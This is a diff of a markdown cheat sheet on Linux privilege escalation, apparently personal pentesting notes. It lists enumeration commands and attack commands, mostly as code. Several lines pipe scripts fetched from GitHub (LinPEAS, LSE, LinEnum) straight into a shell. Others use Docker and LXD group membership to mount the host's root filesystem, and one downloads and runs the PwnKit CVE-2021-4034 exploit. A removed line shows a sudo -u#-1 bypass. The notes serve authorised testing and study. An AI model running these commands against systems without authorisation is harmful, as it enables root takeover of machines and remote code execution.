@@ -1,69 +1,141 @@
 # Linux Privilege Escalation
 
-## System Enumeration
+## Tools
 
-### [LinPEAS](https://github.com/peass-ng/PEASS-ng)
+#### [LinPEAS](https://github.com/peass-ng/PEASS-ng)
 
 ```bash
 curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
-### Find SUID and GUID files
-
-### SUID
+#### [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
 
 ```bash
-find / -type f -perm -4000 -ls 2>/dev/null
+curl -sL https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash
 ```
 
-### GUID
+#### [LinEnum](https://github.com/rebootuser/LinEnum)
 
 ```bash
-find / -type f -perm -2000 -ls 2>/dev/null
+curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
 
-### Enviroment Variables
+## System Info
+
+Obtain information about the system **architecture, distribution, and kernel version**.
 
 ```bash
-env || set
+uname -a  # System information
+lsb_release -a  # Distribution information
+getconf LONG_BIT  # System architecture
+cat /proc/version  # Kernel version
+cat /etc/os-release  # OS details
 ```
 
-### Common Config Files
+## Path
 
-{% hint style="info" %}
-If you want to black list any directory you can add: `-not -path "<PATH>/*"`
-{% endhint %}
+Check if you have **write permissions** for any directory in the PATH.
 
 ```bash
-find / -type f -name ".env" 2>/dev/null
-
-find / -type f -name "*conf*.php" 2>/dev/null
+echo $PATH | tr ':' '\n' | sort -u | xargs -I{} bash -c 'if [ -w "{}" ]; then echo "[+] {}"; fi'
 ```
 
-### Check Capabilities
+## Enviroment Variables
+
+Sometimes we can find password or sensitive information in enviroment variables.
+
+```bash
+env  # Environment variables
+set  # Shell variables
+```
+
+## Groups
+
+List all the groups users belongs to.
+
+```bash
+id [user]
+groups [user]
+```
+
+### Docker
+
+If you belong to the **Docker group**, you could **mount the filesystem** within a container and have full access to it, allowing you to modify it.
+
+```bash
+docker run -it --rm -v /:/mnt alpine chroot /mnt sh
+```
+
+### LXD/LXC
+
+Similar to Docker, with **LXD/LXC**, we can also **mount the filesystem** within a container, granting full access to it.
+
+{% code overflow="wrap" %}
+```bash
+# On your machine, download and build an alpine image and transfer it to the host
+git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine
+```
+{% endcode %}
+
+```bash
+# Import the image
+lxc image import ./alpine.tar.gz --alias privimg
+# Create the containter
+lxc init privimg privcont -c security.privileged=true
+# Mount the filesystem
+lxc config device add privcont privdev disk source=/ path=/mnt/root recursive=true
+# Start the container
+lxc start privcont
+# Interactive shell
+lxc exec privcont /bin/sh
+```
+
+## Sudo
+
+[https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+```bash
+# List user privileges
+sudo -l
+# Version
+sudo -V | grep "Sudo ver"
+```
+
+## Capabilities <a href="#capabilities" id="capabilities"></a>
+
+[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-### Open Ports
+## SUID
+
+[https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+```bash
+find / -type f -perm -4000 -ls 2>/dev/null
+```
+
+## Open Ports
 
 ```bash
 ss -nltp
+netstat -punta
 ```
 
-### Cron Jobs
+## Cron Jobs
+
+[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs)
 
 ```bash
-# Cron files
+crontab -l
 find / -name "cron*" 2>/dev/null
-
-# Logs
 ls -l /var/log/syslog
 ls -l /var/log/cron
 ```
 
-### Process Monitor
+## Process Monitor
 
 {% hint style="info" %}
 You can add words to the blacklist on the `grep -Ev` section.
@@ -75,7 +147,7 @@ diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | \
 grep -Ev "kworker|user,command"; old_ps=$new_ps; done
 ```
 
-### Writable Scripts
+## Writable Scripts
 
 ```bash
 find / -user <USER> -writable \( -name "*.sh" -o -name "*.py" \) -type f 2>/dev/null
@@ -83,21 +155,7 @@ find / -user <USER> -writable \( -name "*.sh" -o -name "*.py" \) -type f 2>/dev/
 
 ## Exploits
 
-### Sudo
-
-Check sudo version
-
-```bash
-sudo -V | grep "Sudo ver"
-```
-
-Sudo < v1.28
-
-```bash
-sudo -u#-1 /bin/bash
-```
-
-### PwnKit - (CVE-2021-4034)
+### Polkit - (CVE-2021-4034)
 
 [https://github.com/Almorabea/pkexec-exploit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
 
@@ -111,10 +169,4 @@ curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-202
 ```bash
 curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \
 -o PwnKit && chmod +x PwnKit && ./PwnKit
-```
-
-### Docker
-
-```bash
-docker run -it --rm -v /:/mnt alpine chroot /mnt sh
 ```
